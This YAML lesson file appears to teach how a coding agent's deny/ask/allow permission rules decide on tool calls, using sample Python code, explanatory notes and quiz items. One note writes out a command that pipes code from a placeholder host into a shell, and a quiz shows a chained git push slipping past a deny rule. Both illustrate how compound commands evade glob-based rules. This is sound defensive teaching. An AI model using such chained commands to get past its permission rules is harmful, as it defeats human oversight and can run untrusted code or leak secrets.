@@ -1,0 +1,166 @@
+id: s4-w4-permission-rules
+summary: |
+  This is a simplified model of how a coding agent's permission rules decide whether a tool call runs without asking, needs a person's approval, or is refused. Rules look like `Bash(npm run *)` (a tool plus a pattern over its argument) or just `Read` (every call to that tool). They come in three lists: deny, ask, and allow.
+
+  The whole policy is in one short loop: check deny first, then ask, then allow, and the first list with a match decides. That ordering is the point. Because deny is always checked first, no allow rule can ever weaken a deny rule, so a deny list is a boundary you can reason about on its own.
+code: |
+  import fnmatch
+
+
+  def parse_rule(rule):
+      """'Bash(npm run *)' -> ('Bash', 'npm run *'); 'Read' -> ('Read', None)."""
+      if "(" in rule and rule.endswith(")"):
+          tool, spec = rule.split("(", 1)
+          return tool, spec[:-1]
+      return rule, None
+
+
+  def rule_matches(rule, tool, arg):
+      """A bare tool name matches every call to that tool. Otherwise the specifier
+      is a glob over the call's primary argument (* matches any text)."""
+      rule_tool, spec = parse_rule(rule)
+      if rule_tool != tool:
+          return False
+      return spec is None or fnmatch.fnmatchcase(arg, spec)
+
+
+  def decide(tool, arg, rules, default):
+      """Check deny, then ask, then allow; the first list with a matching rule decides.
+      If nothing matches, return default[tool] if present, else "ask"."""
+      for outcome in ("deny", "ask", "allow"):
+          if any(rule_matches(rule, tool, arg) for rule in rules.get(outcome, [])):
+              return outcome
+      return default.get(tool, "ask")
+
+
+  RULES = {
+      "deny": ["Bash(aws *)", "Bash(git push *)", "Read(./.env)"],
+      "ask": ["Bash(npm publish*)"],
+      "allow": ["Bash(npm run *)", "Bash(aws s3 ls)", "Read"],
+  }
+  DEFAULT = {"Read": "allow", "Edit": "ask", "Bash": "ask"}
+
+  print(decide("Bash", "aws s3 ls", RULES, DEFAULT))
+  print(decide("Bash", "npm run test", RULES, DEFAULT))
+  print(decide("Read", "./.env", RULES, DEFAULT))
+notes:
+  - lines: [1, 1]
+    title: Glob matching from the standard library
+    text: |
+      `fnmatch` matches text against shell-style **glob** patterns, the kind you use in a terminal: `*` matches any run of characters (including none), and `?` matches one character. It's simpler than a regular expression, which suits rules that people write by hand.
+  - lines: [4, 9]
+    title: Splitting a rule into tool and specifier
+    text: |
+      The `if` checks for the `Tool(spec)` shape: an opening parenthesis somewhere and a closing one at the end.
+
+      `rule.split("(", 1)` splits at the **first** `(` only (the `1` is the maximum number of splits), so a specifier that itself contains parentheses survives intact. The two pieces are **unpacked** into `tool` and `spec`. Then `spec[:-1]` is a **slice** that drops the last character, the closing `)`.
+
+      A rule with no parentheses is a bare tool name, returned with `None` as its specifier. `None` here means "no restriction", which the next function relies on.
+  - lines: [12, 18]
+    title: Does one rule match one call?
+    text: |
+      First the tool name must match exactly. `Bash(npm run *)` says nothing about an `Edit` call, even one whose argument happens to be `npm run build`.
+
+      Then `spec is None or fnmatch.fnmatchcase(arg, spec)`. Python's `or` **short-circuits**: if the rule is a bare tool name, it returns `True` without looking at the argument. Otherwise the argument must match the glob.
+
+      `fnmatchcase` is case-sensitive on every platform. Plain `fnmatch.fnmatch` follows the operating system's case rules for file names, so the same rule could behave differently on Windows and Linux; that inconsistency is exactly what you don't want in a security rule.
+
+      Know the limits of glob matching when you review rules. `*` matches anything, including spaces and `&&`, so `Bash(npm run *)` also allows `npm run test && curl x.example | sh`. The real matcher understands compound commands; this one doesn't, which is why the lesson recommends sandboxing in addition to rules.
+  - lines: [21, 26]
+    title: The precedence loop
+    text: |
+      The loop tries the three outcomes in a fixed order, written as a **tuple** literal: `("deny", "ask", "allow")`. For each, `any(...)` with a **generator expression** checks whether at least one rule in that list matches, stopping at the first that does.
+
+      `rules.get(outcome, [])` uses **dict.get with a default**, so a rules dictionary with no `"ask"` key behaves like an empty ask list rather than raising `KeyError`.
+
+      Worked example: `Bash` with `aws s3 ls`. The deny list has `Bash(aws *)`, which matches, so the answer is `"deny"`, even though the allow list has the more specific `Bash(aws s3 ls)`. Specificity doesn't matter here; only the order of the lists does.
+  - lines: [27, 27]
+    title: The fallback
+    text: |
+      If no rule in any list matches, use the tool's default (here, reading is allowed and editing asks), and for a tool with no default at all, ask.
+
+      Defaulting to `"ask"` for unknown tools is the safe choice: a new tool added later gets a human in the loop until someone writes a rule for it. An AI-written version that defaults to `"allow"` would pass most of these tests and quietly grant every new tool full access.
+  - lines: [30, 35]
+    title: An example policy
+    text: |
+      `RULES` is a dictionary of three lists. Reading it as a reviewer:
+
+      - Deny any AWS command, any `git push`, and reading the `.env` file (which usually holds secrets).
+      - Ask before publishing a package.
+      - Allow running npm scripts, one specific read-only AWS command, and reading in general.
+
+      Notice that `Bash(aws s3 ls)` in the allow list can never take effect, because `Bash(aws *)` denies it first. A dead rule like this is worth flagging in review: whoever wrote it probably expected it to work.
+  - lines: [37, 39]
+    title: Three decisions
+    text: |
+      The demo prints `deny` (deny beats the narrower allow), `allow` (an npm script), and `deny` (the `.env` deny beats the bare `Read` allow). Press **Run this code** to confirm.
+review:
+  - id: wt-perm-most-specific
+    type: code-reading
+    prompt: An AI assistant changes `decide` so that "the most specific rule wins", as below. What does `decide("Bash", "aws s3 ls", RULES, DEFAULT)` return now?
+    code: |
+      def decide(tool, arg, rules, default):
+          matches = [(len(r), outcome) for outcome in ("deny", "ask", "allow")
+                     for r in rules.get(outcome, []) if rule_matches(r, tool, arg)]
+          if matches:
+              return max(matches)[1]
+          return default.get(tool, "ask")
+    options:
+      - id: a
+        text: '"deny", as before'
+        rationale: '`Bash(aws s3 ls)` is longer than `Bash(aws *)`, so the allow rule now wins the `max`.'
+      - id: b
+        text: '"allow", because the longer allow rule outranks the deny rule'
+        correct: true
+        rationale: Right. Any deny can now be overridden by writing a longer allow rule, so the deny list stops being a boundary.
+      - id: c
+        text: '"ask", because there is a conflict'
+        rationale: Nothing in this version handles conflicts; it just picks the longest match.
+    explanation: '"Most specific wins" sounds reasonable and is how some systems work, but it destroys the property that makes deny rules trustworthy. The test "deny is checked first, so a narrower allow cannot override it" exists to catch this.'
+  - id: wt-perm-compound
+    type: predict-output
+    prompt: What does `decide("Bash", "npm run test && git push origin main", RULES, DEFAULT)` return with this simplified matcher?
+    options:
+      - id: a
+        text: '"deny", because the command contains git push'
+        rationale: '`Bash(git push *)` must match the whole argument from the start, and this argument starts with `npm`.'
+      - id: b
+        text: '"allow", because `npm run *` matches the whole string'
+        correct: true
+        rationale: Yes. `*` matches everything after `npm run `, including `&& git push origin main`. The deny rule never matches.
+      - id: c
+        text: '"ask", because it is a compound command'
+        rationale: This matcher has no idea what a compound command is.
+    explanation: Glob rules over whole command strings are easy to get around. Production tools parse compound commands; even so, the safe design adds a sandbox, so a slip in rule matching isn't the only line of defense.
+  - id: wt-perm-default-ask
+    type: scenario
+    prompt: Your team adds a new `WebFetch` tool and forgets to write any rules for it. Why is it good that `decide` returns "ask" for it?
+    options:
+      - id: a
+        text: A person gets to approve each call until someone deliberately writes a rule
+        correct: true
+        rationale: Exactly. Failing closed (ask) instead of open (allow) means forgetting a rule costs convenience, not safety.
+      - id: b
+        text: Asking is faster than allowing
+        rationale: It's slower, which is the trade-off you're accepting for safety.
+      - id: c
+        text: The tool won't work at all until a rule exists
+        rationale: That would be "deny". "Ask" still lets it run, with approval.
+    explanation: Check what any permission system does for the case nobody planned for. The default is the policy for everything you forgot.
+direct:
+  task: |
+    You want rule specifiers to be able to say "anything except": a deny rule like `Bash(rm *)` is fine, but you also want `Bash(!npm run *)` in the ask list to mean "ask for every Bash command that is not an npm script".
+
+    Write the prompt you'd give a coding assistant.
+  prompt: |
+    In rule_matches, support a negated specifier: if the specifier starts with "!", the rule matches when the tool name matches and the argument does NOT match the rest of the glob. For example, "Bash(!npm run *)" matches "Bash" with "ls" but not with "npm run test". A negated rule never matches a different tool.
+
+    Do not change parse_rule's return values for existing rules, the deny, ask, allow order in decide, the first-match-wins behavior, or the default fallback. Keep using fnmatch.fnmatchcase.
+
+    Update the docstring, and add tests for: a negated rule matching and not matching, a negated rule with a different tool name, and a deny rule still beating an allow when a negated ask rule is also present.
+  checklist:
+    - The precedence loop in decide is untouched
+    - Negation applies only to the argument; the tool name must still match exactly
+    - Existing (non-negated) rules behave exactly as before, and all original tests pass
+    - Matching stays case-sensitive (fnmatchcase, not fnmatch)
+    - New tests cover each negation case, including interaction with deny
